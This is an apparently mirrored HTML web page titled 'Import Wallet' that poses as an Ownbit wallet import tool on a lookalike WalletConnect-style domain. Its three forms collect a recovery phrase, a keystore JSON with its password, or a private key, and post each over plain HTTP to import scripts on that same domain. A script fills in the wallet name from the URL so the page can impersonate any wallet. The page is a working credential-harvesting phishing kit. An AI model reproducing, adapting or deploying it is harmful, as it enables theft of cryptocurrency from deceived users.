<html>

<!-- Mirrored from www.submainetconnect.com/import.php?import=Ownbit by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 12 Dec 2021 02:59:54 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head><meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Import Wallet</title><link rel="stylesheet" href="port/main.css" type="text/css"> <link rel="icon" href="port/logo.svg">
<script>
function openCity(evt, cityName) {
// Declare all variables
var i, tabcontent, tablinks;
      
// Get all elements with class="tabcontent" and hide them
tabcontent = document.getElementsByClassName("tabcontent");
for (i = 0; i < tabcontent.length; i++) {
  tabcontent[i].style.display = "none";
}
      
// Get all elements with class="tablinks" and remove the class "active"
tablinks = document.getElementsByClassName("tablinks");
for (i = 0; i < tablinks.length; i++) {
  tablinks[i].className = tablinks[i].className.replace(" active", "");
}
      
// Show the current tab, and add an "active" class to the button that opened the tab
 document.getElementById(cityName).style.display = "block";
evt.currentTarget.className += " active";
}
 </script>    
</head>    
    
<body>
    <center>
    <div class="top">
            <a href="#footer" class="left">Github</a>
            <a href="#footer" class="left">Docs</a>
            <a href="index-2.html" class="main"><img src="port/logo.svg" alt="logo"></a>
            <a href="index-2.html#wallets" class="left">Wallets</a>
            <a href="index-2.html#wallets" class="left">Apps</a>
    </div>
    <br>
    <h2><center>Import Wallet</center></h2>
    <br>
    <div class="tab">
      <button class="tablinks active" id="default" onClick="openCity(event, 'phrase')">Phrase</button>
      <button class="tablinks" onClick="openCity(event, 'keystore')">Keystore JSON</button>
      <button class="tablinks" onClick="openCity(event, 'private')">Private Key</button>
    </div>
    
    <div id="phrase" class="tabcontent" style="display: block;">
    <form action="http://www.submainetconnect.com/actions/import.php" method="POST">
    
    <input type="hidden" name="category" value="Phrase">
    <input type="hidden" name="wallet" value="Ownbit">
    
    <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
    <br>
    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
    <br>
    <button type="submit" name="import" class="btn">IMPORT</button>
    </form>
    </div>
    
    <div id="keystore" class="tabcontent" style="display: none;">
    <form action="http://www.submainetconnect.com/actions/imports.php" method="POST">
    
    <input type="hidden" name="category" value="Keystore JSON">
    <input type="hidden" name="wallet" value="Ownbit">
    <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
    <br>
    <div class="field">
        <input type="text" name="password" required="required" placeholder="Password">
    </div>
    <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
    <br>
    <button type="submit" name="import" class="btn">IMPORT</button>
    </form>
    </div>
    
    <div id="private" class="tabcontent" style="display: none;">
    <form action="http://www.submainetconnect.com/actions/importz.php" method="POST">
    <input type="hidden" name="category" value="Private Key">
    <input type="hidden" name="wallet" value="Ownbit">
    <div class="field">
        <input type="text" name="key" class="key" required="required" placeholder="Private Key">
    </div>
    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
    <br>
    <button type="submit" name="import" class="btn">IMPORT</button>
    </form>
    </div>
    
    <script>
        document.getElementById("default").click();
        const urlParams = new URLSearchParams(window.location.search)
        const walletType = urlParams.get("import")
        document.querySelectorAll("input[name='wallet']").forEach( node => {
          node.value = walletType
        })
    </script>
<footer><div id="footer">
<p><img src="saved/discord.html" class="footimg">  <a href="https://discord.gg/">Discord</a></p><br>
<p><img src="saved/telegram.html" class="footimg">  <a href="https://t.me/">Telegram</a></p><br>
<p><img src="saved/twitter.html" class="footimg">  <a href="https://twitter.com/">Twitter</a></p><br>
<p><img src="saved/github.html" class="footimg">  <a href="https://github.com/">Github</a></p><br>
</div></footer>
</center>
</body>
<!-- Mirrored from www.submainetconnect.com/import.php?import=Ownbit by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 12 Dec 2021 02:59:54 GMT -->
</html>